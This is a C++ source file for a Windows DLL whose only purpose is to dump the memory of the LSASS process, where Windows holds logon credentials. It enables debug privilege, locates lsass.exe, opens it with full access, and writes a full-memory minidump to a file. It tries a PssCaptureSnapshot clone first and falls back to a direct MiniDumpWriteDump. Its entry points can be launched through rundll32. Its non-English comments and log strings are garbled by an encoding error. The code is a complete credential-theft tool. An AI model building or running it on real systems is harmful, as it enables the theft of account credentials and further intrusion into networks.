#include "pch.h"
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <processsnapshot.h>
#include <string>
#include <sstream>

#pragma comment (lib, "Dbghelp.lib")

// ȫ�ֱ������ڴ洢�����Ϣ
std::wstring g_output;

// �����־����
void Log(const std::wstring& message)
{
    g_output += message + L"\n";
    // ������ OutputDebugStringW
}

// MiniDump �ص�����
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case 16: // IsProcessSnapshotCallback
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}

// ���õ���Ȩ��
BOOL EnableDebugPrivilege()
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    Log(L"[*] ������������Ȩ��...");
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        Log(L"[-] OpenProcessToken ʧ��: " + std::to_wstring(GetLastError()));
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
    {
        Log(L"[-] LookupPrivilegeValue ʧ��: " + std::to_wstring(GetLastError()));
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
    {
        Log(L"[-] AdjustTokenPrivileges ʧ��: " + std::to_wstring(GetLastError()));
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    Log(L"[+] �ɹ���������Ȩ��");
    return TRUE;
}

// ���� dump ����
BOOL DumpLsass(LPCWSTR outputPath = NULL)
{
    Log(L"[*] ��ʼ LSASS dump ����...");

    // ����Ȩ��
    if (!EnableDebugPrivilege())
    {
        Log(L"[-] �޷���������Ȩ��");
        return FALSE;
    }

    // ���� lsass.exe
    DWORD lsassPID = 0;
    Log(L"[*] �������̿���...");
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        Log(L"[-] �������̿���ʧ��: " + std::to_wstring(GetLastError()));
        return FALSE;
    }

    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    BOOL foundLsass = FALSE;
    if (Process32FirstW(snapshot, &processEntry))
    {
        do
        {
            std::wstringstream ss;
            ss << L"[*] ������: " << processEntry.szExeFile << L" (PID: " << processEntry.th32ProcessID << L")";
            Log(ss.str());

            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0)
            {
                lsassPID = processEntry.th32ProcessID;
                foundLsass = TRUE;
                std::wstringstream ss2;
                ss2 << L"[+] �ҵ� lsass.exe, PID: " << lsassPID;
                Log(ss2.str());
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);

    if (!foundLsass)
    {
        Log(L"[-] δ�ҵ� lsass.exe ����");
        return FALSE;
    }

    // �� lsass ����
    Log(L"[*] �� lsass.exe ����, PID: " + std::to_wstring(lsassPID));
    HANDLE lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
    if (lsassHandle == NULL)
    {
        std::wstringstream ss;
        ss << L"[-] �� lsass.exe ʧ��, ������: " << GetLastError();
        Log(ss.str());
        return FALSE;
    }
    Log(L"[+] �� lsass.exe �ɹ�");

    // ȷ������ļ�·��
    std::wstring dumpPath;
    if (outputPath != NULL && wcslen(outputPath) > 0)
    {
        dumpPath = outputPath;
    }
    else
    {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        dumpPath = std::wstring(tempPath) + L"lsass_" + std::to_wstring(GetTickCount()) + L".dmp";
    }
    Log(L"[*] Dump �ļ�·��: " + dumpPath);

    // ��������ļ�
    Log(L"[*] ���� dump �ļ�...");
    HANDLE outFile = CreateFileW(dumpPath.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outFile == INVALID_HANDLE_VALUE)
    {
        Log(L"[-] ���� dump �ļ�ʧ��: " + std::to_wstring(GetLastError()));
        CloseHandle(lsassHandle);
        return FALSE;
    }
    Log(L"[+] ���� dump �ļ��ɹ�");

    Log(L"[*] ���� dump LSASS...");

    // ���Է���1��ʹ�� PssCaptureSnapshot
    HPSS snapshotHandle = NULL;
    DWORD flags = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES |
        PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION |
        PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE |
        PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED |
        PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL |
        PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;

    BOOL dumpSuccess = FALSE;
    Log(L"[*] ���� PssCaptureSnapshot...");
    DWORD result = PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, &snapshotHandle);

    if (result == ERROR_SUCCESS)
    {
        Log(L"[+] PssCaptureSnapshot �ɹ�");
        MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
        ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
        CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
        CallbackInfo.CallbackParam = NULL;

        Log(L"[*] ���� MiniDumpWriteDump (snapshot) ...");
        dumpSuccess = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
        if (dumpSuccess)
            Log(L"[+] MiniDumpWriteDump (snapshot) �ɹ�");
        else
            Log(L"[-] MiniDumpWriteDump (snapshot) ʧ��: " + std::to_wstring(GetLastError()));

        PssFreeSnapshot(GetCurrentProcess(), snapshotHandle);
    }
    else
    {
        Log(L"[-] PssCaptureSnapshot ʧ��, ������: " + std::to_wstring(result));
        Log(L"[*] ����ֱ�� MiniDumpWriteDump ...");
        dumpSuccess = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if (dumpSuccess)
            Log(L"[+] MiniDumpWriteDump (direct) �ɹ�");
        else
            Log(L"[-] MiniDumpWriteDump (direct) ʧ��: " + std::to_wstring(GetLastError()));
    }

    if (dumpSuccess)
    {
        Log(L"[+] LSASS dump �ɹ�!");
        Log(L"[+] Dump �ļ�: " + dumpPath);
    }
    else
    {
        Log(L"[-] dump ʧ��");
    }

    // ������Դ
    CloseHandle(outFile);
    CloseHandle(lsassHandle);

    return dumpSuccess;
}

// ��������1���� rundll32 ����
extern "C" __declspec(dllexport) void CALLBACK DumpLsassW(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow)
{
    g_output.clear();
    Log(L"[*] ���� DumpLsassW");
    std::wstring outputPath;
    if (lpszCmdLine && wcslen(lpszCmdLine) > 0)
    {
        outputPath = lpszCmdLine;
        Log(L"[*] �����в������·��: " + outputPath);
    }

    BOOL success = DumpLsass(outputPath.empty() ? NULL : outputPath.c_str());

    // ʼ�յ�����ʾ��־
    MessageBoxW(hwnd, g_output.c_str(), L"LSASS Dump Result", success ? MB_OK : MB_OK | MB_ICONERROR);
}

// ��������2���� rundll32 ���ã�ANSI�汾��
extern "C" __declspec(dllexport) void CALLBACK DumpLsassA(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    g_output.clear();
    Log(L"[*] ���� DumpLsassA");
    std::wstring outputPath;
    if (lpszCmdLine && strlen(lpszCmdLine) > 0)
    {
        int len = MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, NULL, 0);
        if (len > 0)
        {
            outputPath.resize(len);
            MultiByteToWideChar(CP_ACP, 0, lpszCmdLine, -1, &outputPath[0], len);
        }
        Log(L"[*] �����в������·��: " + outputPath);
    }

    DumpLsassW(hwnd, hinst, outputPath.empty() ? NULL : &outputPath[0], nCmdShow);
    // DumpLsassW �Ѿ�����
}

// ��������3������̵���
extern "C" __declspec(dllexport) BOOL DumpLsassToFile(LPCWSTR outputPath)
{
    g_output.clear();
    Log(L"[*] ���� DumpLsassToFile");
    BOOL result = DumpLsass(outputPath);
    MessageBoxW(NULL, g_output.c_str(), L"LSASS Dump Result", result ? MB_OK : MB_OK | MB_ICONERROR);
    return result;
}

// ��������4���޲����汾
extern "C" __declspec(dllexport) BOOL DumpLsassDefault()
{
    g_output.clear();
    Log(L"[*] ���� DumpLsassDefault");
    BOOL result = DumpLsass(NULL);
    MessageBoxW(NULL, g_output.c_str(), L"LSASS Dump Result", result ? MB_OK : MB_OK | MB_ICONERROR);
    return result;
}

// DLL ��ڵ�
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}